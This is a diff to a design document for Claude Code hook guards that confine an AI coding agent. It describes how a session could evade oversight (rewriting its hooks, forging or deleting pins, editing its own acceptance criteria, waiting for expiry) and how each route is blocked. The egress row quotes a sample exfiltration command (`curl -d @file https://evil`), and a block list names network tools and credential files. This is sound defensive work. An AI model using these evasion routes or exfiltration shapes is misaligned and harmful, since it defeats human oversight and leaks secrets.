@@ -19,6 +19,17 @@ tool would run — so the guards run inside a boundary that converts any uncaugh
 exception to exit 2. (Malformed harness *stdin* still fails open by design — a broken
 payload must not brick every tool call.)
 
+**Running out of time fails closed too (KIT-684).** Claude Code treats a hook that runs
+past its `timeout` (10 seconds in `.claude/settings.json`) as a non-blocking error and runs
+the tool unjudged, so one stuck `git` (a locked repository, a slow mount) would switch every
+guard off for that call. Each `git` and `gh` call has its own timeout, but they add up, so
+the hook keeps a 7-second deadline of its own, armed as it starts: a call it could not judge
+in time is refused, and the message names the deadline. The interrupted subprocess is killed
+on the way out. A 1-second backstop writes the reason and exits 2 if that unwinding ever
+stalls. The battery stages a `git` that hangs and checks the refusal arrives inside the
+settings timeout, that every subprocess call has a timeout, and that the deadline and
+backstop end at least a second before the settings timeout.
+
 **Session root:** the anchor is `CLAUDE_PROJECT_DIR` (falling back to the hook file's
 location), **widened to the worktree the session's transcript folder names** — the
 payload's `transcript_path` lives under `~/.claude/projects/<launch dir, non-alphanumerics
@@ -59,6 +70,13 @@ widens anything).
 
 ### Universal guards (keep in every project)
 
+**NotebookEdit is a write (KIT-673).** Every row below that names Edit/Write judges a
+NotebookEdit too: the branch and branch-naming guards, the cross-worktree guard, the `.env`
+and credential-file names, and the secret values. A NotebookEdit names its file
+`notebook_path` and its text `new_source`, so a guard that read only `file_path` and the
+content let a notebook edit on `main`, into another checkout, or with a key in a cell
+straight through. The pipeline's ticket-branch guard judges it the same way.
+
 | What it blocks | Tool | Why |
 |---|---|---|
 | **Editing the hooks themselves** — `pre-tool-use.py`, `audit.py`, `stop-pr-check.py`, `session-start.py`, `session-end.py`, `.claude/settings.json`, `.claude/settings.local.json` | Edit/Write/NotebookEdit, **and** Bash mutations (`>`, `tee`, `sed -i`, `cp`/`mv`/`rm`, `chmod`/`chown`/`awk`, `git checkout/restore/reset/clean/stash/apply/rm/mv`, *any* `python`/`node`/`ruby` invocation naming a protected path) | Otherwise every block below is theater — Claude could just rewrite the guard away or unwire it in settings (`settings.local.json` overrides project scalars, so writing it could neutralize every guard for future sessions). `session-start.py` and `session-end.py` are no guards, but each runs after the session could edit it, outside the Bash sandbox: SessionStart on every resume (KIT-463), SessionEnd when the session ends (KIT-460). These files are **human-only**: to change one, Claude composes + validates a scratch copy and prints a terminal command for the human to run. Reads (`cat`/`grep`/Read) are allowed; an unresolvable target path fails **closed**. A first line, not a sandbox — the real backstop is still git + review |
@@ -83,7 +101,7 @@ widens anything).
 | **Egress/exfiltration shapes** — a network tool (`curl`/`wget`/`scp`/`sftp`/`nc`) targeting a **non-allowlisted host** *while* uploading (`-d`/`--data*`/`-F`/`-T`/`-X POST\|PUT\|PATCH`), sending an `@file` payload, splicing `$VAR` into the URL, or any `scp`/`nc` push | Bash | Under `bypassPermissions` an outbound `curl -d @file https://evil` runs unprompted. Allowlist is a **domain-boundary suffix** match (`evil-github.com` and `github.com.evil.tld` do *not* pass): localhost, `github.com`, `githubusercontent.com`, `anthropic.com`, `npmjs.org` + a fenced stack-specific slot (ships with `linear.app`, the issue-tracker API this kit's own sessions call; replace it with YOUR project's backends — the commented worked example beside it is a managed-backend host pair). Plain GETs/downloads stay allowed. **Why `linear.app` sits in the slot, enabled, rather than in the core or off:** it cannot ship *off* — `.claude/skills/setup-board/SKILL.md` tells a session to POST to `api.linear.app/graphql` for the seven operations Linear's MCP does not cover, and this file is self-protected, so a session that hit the block could not lift it; a kit that ships a skill tripping its own guard has a bug, not a default. It does not belong in the **core**, which is for hosts no project may remove — Linear is one tracker among many and the pipeline using it is optional (contract §2). The slot's usual cost, the kit's copy diverging from the shipped template, does not arise: the kit ships exactly **one** copy of this hook (there is no `templates/hooks/pre-tool-use.py`). What the placement does *not* buy is narrowing — it is a review label, not a second file, so the entry is live for every project instantiated from the kit, Linear or not. What it buys is a signpost that it is one line and yours to delete, which `BOOTSTRAP-PROMPT.md` step 2 now says out loud |
 | Reading `.env*` (non-example), `*.pem`, `*.key`, `id_rsa`, `credentials` | Read | Same |
 | Writing to `.env*` (non-example), `id_rsa`, `credentials` | Edit/Write | Only `.env.example` is committed; key/credential files are human-managed |
-| Embedding secret values | Edit/Write | Regex patterns for Anthropic keys, OpenAI keys (project, service-account, admin and legacy shapes; KIT-42), DB URLs with passwords, private key blocks, AWS keys, GitHub tokens, raw JWTs |
+| Embedding secret values | Edit/Write | Regex patterns for Anthropic keys, OpenAI keys (project, service-account, admin and legacy shapes; KIT-42), DB URLs with passwords, private key blocks, AWS keys, GitHub tokens, raw JWTs, and the pipeline's own credentials (KIT-683): Linear API keys, Slack bot, user and app-level tokens, and GitHub fine-grained tokens. Those last come from one list, `scripts/secret_shapes.py`, which this hook cannot read (it reads no file a session can edit) but both batteries check: `test_hooks.py` that the hook refuses each and passes its near miss, and the secret scan's selftest that secretlint's real rules find each. A new pipeline credential goes on that list first, and both fail until both layers know it |
 
 ### Stack-specific guards (Supabase/Postgres — replace for your datastore)
 
@@ -149,7 +167,7 @@ are all agent-mutable, so:
 | **AC integrity** | configured + pinned ticket, or on the dispatcher's lane (its own ticket) | Editing the session's **own in-progress** ticket's description / acceptance criteria / title — a `patch` (the Linear MCP's partial edit of the description) included. Review compares the PR against the snapshot taken at dispatch, so a session that can rewrite its own ACs can make scope creep look compliant — the ticket-layer twin of weakening a test assertion. Comments and status changes stay allowed |
 | **Grader-path protection** | configured + pinned | Edit/Write **and** Bash mutations of `.github/workflows/**`, **`templates/workflows/**` and `templates/hooks/**`**, `delivery.json`, and every glob in `autonomy.riskPaths` — the machinery that decides whether the work is acceptable. Uses the *same* operator scaffold as self-protection (`>`, `tee`, `sed -i`, `cp`/`mv`/`rm`, `chmod`/`chown`/`awk`, `git checkout/restore/…`, any interpreter naming the path); reads and `git add` stay allowed. **Hook scripts and `settings*.json` remain blocked unconditionally, pipeline or not** — nothing here made that mode-conditional. **The staging mirrors are on the floor with the paths they mirror:** `templates/` holds the inert copies that *become* `.github/workflows/**` and `.claude/hooks/**` at bootstrap (`templates/README.md` is the activation table), so the staged bytes are the ones CI later runs holding repository secrets. Gating only the destination attaches the guard when a file becomes **visible** rather than when its contents are **decided**, and leaves the activation as a bare `git mv` that reads in review as "just a move". The rule, so the next mirror needs no patch: *for every floored path, its staging copy is floored with it.* `templates/README.md` and `templates/scripts/**` are not mirrors of a floored path and stay editable |
 | **Ticket-branch** | configured + `branch.requireTicketId` | Edit/Write/`git commit` on a branch whose ticket segment isn't the pinned ID. The branch regex is lower-case only, so tracker IDs **must** be lower-cased (`feat/eng-123-token-refresh`) and the comparison is case-**in**sensitive |
-| **Pin binding** | configured | A malformed pin, an unrecognized `pin_version`, a pin written for a **different worktree**, or — on a `ticket`-mode session — an **expired** one. A hard stop, not a warning. **An expiry is not an absence:** an absence means nothing ever bound this session (a human's ad-hoc session, which must not be bricked), while a lapse means a binding *was* issued for this worktree and its ticket, scope and branch can no longer be verified — §2 calls that broken. Reading a lapse as "unpinned" would switch five of six pipeline guards off and make **waiting** an escape. §2 scopes broken to `ticket` mode, so a lapsed `planning` pin keeps working — but the pin object is still read, so every constraint it carried stays on |
+| **Pin binding** | configured | A malformed pin, an unrecognized `pin_version`, a pin written for a **different worktree**, or — on a `ticket`-mode session — an **expired** one. A hard stop, not a warning. **An expiry is not an absence:** an absence means nothing ever bound this session (a human's ad-hoc session, which must not be bricked), while a lapse means a binding *was* issued for this worktree and its ticket, scope and branch can no longer be verified — §2 calls that broken. Reading a lapse as "unpinned" would switch five of six pipeline guards off and make **waiting** an escape. §2 scopes broken to `ticket` mode, so a lapsed `planning` pin keeps working — but the pin object is still read, so every constraint it carried stays on. **A deleted pin is not an absence either (KIT-674).** The dispatcher's ledger, `<pinsRoot>/ledger.jsonl`, sits beside the pins, outside the worktree, and holds a row for every pin written and every release. When its last row for this worktree is a pin row under a day old (the longest any kit dispatcher lets a pin live) and the pin is gone, the pin is **missing**: every write is refused, whatever the mode, with a message naming the pin file, the ledger row and the release command. A ledger the hook cannot read refuses every write too, because could not check is not absent. A person ends a binding with `scripts/pipeline_dispatch_local.py --release`, which records it in the ledger; a pin row more than a day old expects nothing, so an old dispatch whose release was never recorded never holds a worktree |
 | **Config anchor** | **always** (universal) | Writing a protected git ref — `git update-ref`, `branch -f/-D/-M main`, a fetch/pull **refspec** targeting `main`/`master`, `symbolic-ref`, `replace`, history rewriters — plus repointing `origin` (`remote set-url/remove/rename`, `git config remote.origin.url`) and any mutation of `.git/**` in Bash or Edit/Write. Guards deliberately read values from the default branch *because* the worktree is model-writable; that only holds while the ref is not, and one `git update-ref` would otherwise pick the `delivery.json` those guards then read — `dispatch.pinsRoot` included, which is a forged pin. Reads and a plain `git fetch` (the one honest writer of `origin/main`) stay allowed, as does `git remote add origin`, which cannot repoint a remote that already exists. Tamper-**evident**, not tamper-proof — same posture §3 states for the pin |
 | **Pins-root containment** | configured | A `dispatch.pinsRoot` that resolves inside the repo or any worktree, or isn't a string, or does not resolve to an absolute path (a `~` path the account database gives no home for, a relative path, `~name` for no such account) — **broken config**, not a silent default. A relative path would be read from the hook's cwd, which a session moves with `cd`. It checks the path the pin is read from, so `~` is the account's home here too, whatever `$HOME` says. §7 makes it a validator hard-fail; the hook re-checks because it must not assume the validator ran, and because this is what a poisoned config would target first: a pins directory the session can write is a pin the session can forge |
 
@@ -158,7 +176,8 @@ of every row):
 
 | Session state | Own ticket | Another ticket | No resolvable target |
 |---|---|---|---|
-| pipeline off, or no pin and no lane marker (a human's ad-hoc session) | allow | allow | allow |
+| pipeline off, or no pin, no ledger row expecting one, and no lane marker (a human's ad-hoc session) | allow | allow | allow |
+| a pin the ledger says was written and never released is **gone**, or the pin store **could not be read** (KIT-674) | **deny every write** | **deny** | **deny** |
 | **lane marker** present, or the hook could not check for one (a dispatcher that binds by delegation, KIT-241); a pin is then not read | allow (the ticket the worktree folder, or its parent, is named after) | **deny** | **deny** for issue writes and creates (fail closed); allow for comments |
 | …and the worktree folder names **no ticket** | — | **deny** any write naming a ticket | **deny** for issue writes and creates; allow for comments |
 | `ticket` mode | allow | **deny** | **deny** for issue writes (fail closed); allow for comments |
@@ -201,7 +220,8 @@ never bricked. An adversary must not be able to flip a guard open by inducing an
 and "inducing an error" includes simply **waiting**, which is why an expired pin is
 broken rather than absent. The battery covers the error paths too: a broken
 `delivery.json`, an unrecognized version, a malformed pin, an expired pin (ticket *and*
-non-ticket mode), a foreign-worktree pin, a `pinsRoot` of the wrong type, and label IDs
+non-ticket mode), a foreign-worktree pin, a deleted pin and a ledger that cannot be read
+(KIT-674), a `pinsRoot` of the wrong type, and label IDs
 that resolve to nothing. One deliberate carve-out: when the config is broken — parse
 failure or an out-of-bounds `pinsRoot` alike — editing `delivery.json` itself stays
 allowed, so the repo is never held hostage by its own config.
@@ -221,9 +241,11 @@ may carry a real marker. A case checks the hook names that path exactly once.
 
 **Known limits** (documented rather than implied): the pin is *tamper-evident, not
 tamper-proof* — the session's shell runs as the same user, so `0444` and a path outside
-the repo raise the cost of deleting or rewriting a pin without making it impossible; a
-deleted pin degrades to the unpinned (fail-open-for-withholding) path, and the ledger is
-what makes that divergence visible. On the dispatcher's lane a pin is not read at all, so
+the repo raise the cost of deleting or rewriting a pin without making it impossible. A
+pin deleted within a day of its writing is caught by the ledger (KIT-674), but a session
+that can delete its pin can edit the ledger beside it too, and a pin row more than a day
+old expects nothing, so the ledger raises the cost of that tamper and makes it visible
+without making it impossible. On the dispatcher's lane a pin is not read at all, so
 neither forging nor deleting one changes anything there. A comment or relation naming
 another ticket by an internal UUID passes on that lane, as the contract allows a target
 the guard cannot resolve (§4 reporting). Tracker mutations are recognized by tool **verb**
